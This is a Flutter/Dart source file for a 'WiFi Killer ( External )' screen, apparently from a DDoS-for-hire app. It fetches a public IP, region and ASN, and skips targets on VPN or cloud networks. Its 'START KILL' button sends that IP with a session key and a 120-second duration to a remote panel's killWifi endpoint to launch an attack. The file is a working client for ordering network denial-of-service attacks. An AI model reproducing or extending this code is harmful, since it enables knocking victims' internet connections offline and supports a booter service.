import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  // --- Theme Colors (BLACK & BLUE) ---
  // UBAH: Silver diganti jadi Blue
  static const Color primaryColor = Color(0xFF00D4AA); // Material Blue
  static const Color backgroundColor = Color(0xFF090E14); // Hitam Pekat
  static const Color cardColor = Color(0xFF111820); // Abu-abu Gelap

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://panel4.ikyhost.cloud:2283/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("❌ Failed", "Server rejected the request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardColor,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: BorderSide(color: primaryColor.withOpacity(0.3))
        ),
        title: Text(title,
            style: TextStyle(
                color: primaryColor,
                fontFamily: 'Rajdhani', // UBAH: Font
                fontWeight: FontWeight.bold,
                shadows: [Shadow(color: primaryColor, blurRadius: 2)]
            )
        ),
        content: Text(message,
            style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani')), // UBAH: Font
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: primaryColor)),
          ),
        ],
      ),
    );
  }

  Widget _infoCard(String title, String value, IconData icon) {
    return Card(
      color: cardColor,
      shadowColor: primaryColor.withOpacity(0.2),
      elevation: 6,
      shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: primaryColor.withOpacity(0.1))
      ),
      child: ListTile(
        leading: Icon(icon, color: primaryColor),
        title: Text(title,
            style: TextStyle(
                color: primaryColor.withOpacity(0.7),
                fontWeight: FontWeight.bold,
                fontFamily: "Rajdhani")), // UBAH: Font
        subtitle: Text(value,
            style: TextStyle(color: primaryColor, fontSize: 16, fontFamily: 'Rajdhani')), // UBAH: Font
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        title: Text("📡 WiFi Killer ( External )",
            style: TextStyle(
                fontFamily: 'Rajdhani', // UBAH: Font
                fontWeight: FontWeight.bold,
                color: primaryColor
            )
        ),
        backgroundColor: backgroundColor,
        iconTheme: const IconThemeData(color: primaryColor),
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(color: primaryColor.withOpacity(0.2), height: 1),
        ),
      ),
      body: Container(
        decoration: const BoxDecoration(
          color: backgroundColor,
        ),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: isLoading
              ? const Center(
              child: CircularProgressIndicator(color: primaryColor))
              : Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text("🎯 System Information",
                  style: TextStyle(
                      fontSize: 20,
                      color: primaryColor,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Rajdhani', // UBAH: Font
                      shadows: [Shadow(color: primaryColor, blurRadius: 5)]
                  )),
              const SizedBox(height: 12),

              // Info Cards
              _infoCard("IP Address", publicIp, Icons.language),
              _infoCard("Region", region, Icons.map),
              _infoCard("ASN", asn, Icons.storage),

              const SizedBox(height: 20),

              if (isVpn)
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: cardColor,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.redAccent), // Warning border stays Red
                  ),
                  child: Text(
                    "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        color: Colors.white,
                        fontFamily: 'Rajdhani'), // UBAH: Font
                  ),
                ),

              if (!isVpn)
                Center(
                  child: ElevatedButton.icon(
                    onPressed: isAttacking ? null : _attackTarget,
                    icon: const Icon(Icons.wifi_off, color: Colors.black), // Icon black on Blue button
                    label: Text(
                      isAttacking ? "ATTACKING..." : "START KILL",
                      style: TextStyle(
                          fontFamily: 'Rajdhani', // UBAH: Font
                          fontWeight: FontWeight.bold),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: primaryColor, // Blue
                      foregroundColor: Colors.black, // Text black
                      padding: const EdgeInsets.symmetric(
                          horizontal: 40, vertical: 16),
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(30)),
                      elevation: 10,
                      shadowColor: primaryColor.withOpacity(0.5),
                    ),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}